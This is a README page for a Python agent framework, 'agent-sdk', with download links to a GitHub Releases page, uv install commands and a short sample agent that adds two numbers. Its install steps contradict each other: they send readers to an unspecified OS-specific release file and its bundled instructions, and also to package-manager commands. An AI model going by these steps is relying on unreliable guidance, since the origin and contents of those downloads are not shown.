---
layout: "default"
title: "🌟 agent-sdk - Simple Tool Framework for Everyone"
description: "🔄 Build simple and effective agents with a straightforward loop framework, powering automation without unnecessary complexity."
---
# 🌟 agent-sdk - Simple Tool Framework for Everyone

[![Download agent-sdk](https://img.shields.io/badge/Download-agent--sdk-brightgreen)](https://github.com/KewalPra/agent-sdk/releases)

## 🚀 Getting Started

Welcome to agent-sdk! This tool helps you build easy programs using a straightforward framework. You do not need programming skills to get started.

### 💻 System Requirements

- **Operating System**: Windows, macOS, or Linux
- **Python**: Version 3.7 or higher
- **Internet Connection**: Required for setup and updates

## 📥 Download & Install

To download agent-sdk, visit this page: [agent-sdk Releases](https://github.com/KewalPra/agent-sdk/releases)

1. On the Releases page, find the latest version of agent-sdk.
2. Download the file suitable for your operating system.
3. Follow the installation instructions included with the file.

## ⚙️ Installation Steps

1. **Open Terminal or Command Prompt**: 
   - For Windows: Search for `cmd` in the Start Menu.
   - For macOS: Use Spotlight (Command + Space) and type `Terminal`.
   - For Linux: Open your preferred terminal.

2. **Install the SDK**: 
   You can install the agent-sdk using one of these commands:
   
   ```bash
   uv sync
   ```
   or 

   ```bash
   uv add bu-agent-sdk
   ```

## 🌟 Quick Start Guide

You can start using agent-sdk to create your first agent quickly. Follow these easy steps:

1. **Open Your Code Editor**: You can use any text editor or code editor you like.
   
2. **Create a New Python File**: Name it something easy, like `my_agent.py`.

3. **Copy the Sample Code**: Use the following code to set up a simple agent:

   ```python
   import asyncio
   from bu_agent_sdk import Agent, tool, TaskComplete
   from bu_agent_sdk.llm import ChatAnthropic
   
   @tool("Add two numbers")
   async def add(a: int, b: int) -> int:
       return a + b
   
   @tool("Signal task completion")
   async def done(message: str) -> str:
       raise TaskComplete(message)
   
   agent = Agent(
       llm=ChatAnthropic(model="claude-sonnet-4-20250514"),
       tools=[add, done],
   )
   
   async def main():
       result = await agent.query("What is 2 + 3?")
       print(result)
   
   asyncio.run(main())
   ```

4. **Run Your Agent**:
   - Save your file.
   - Go back to your terminal or command prompt.
   - Navigate to the folder where you saved `my_agent.py`.
   - Type `python my_agent.py` and hit Enter.

You should see the result printed out. It should show the answer to your question!

## 📖 Understanding the Framework

The key idea behind agent-sdk is simplicity. It helps you create agents that run tasks without complex coding. You focus on what you want to achieve, while the framework handles the details.

### ✨ Features

- **Easy Setup**: Simple commands to get going.
- **No Complex Code**: Just a few lines to handle tasks.
- **Tools for Every Task**: Easily define what your agent can do.

## 💡 Philosophy

Our guiding principle is clear: the value lies in what your model can do. With agent-sdk, you focus on the tasks, not on writing lengthy codes. This leads to more efficient learning and better outcomes.

## 🎉 Support & Community

If you need help or want to connect with others using agent-sdk, you can join our community forums or chat groups. Here are some options:

- **GitHub Discussions**: Share your questions and ideas.
- **Discord Server**: Connect with other users and developers in real time.

## 🌎 Next Steps

Once you feel comfortable with the basics, explore more advanced features in the documentation. You will find guides on creating more complex agents and integrating various tools.

### 🤝 Contributing

We welcome contributions. If you want to help make agent-sdk better, check the issues section on our GitHub page. Your input is valuable.

## 📣 Feedback

Your feedback helps us improve. If you have thoughts about agent-sdk, please reach out through GitHub issues or our community channels. 

Thank you for choosing agent-sdk! Enjoy building your agents.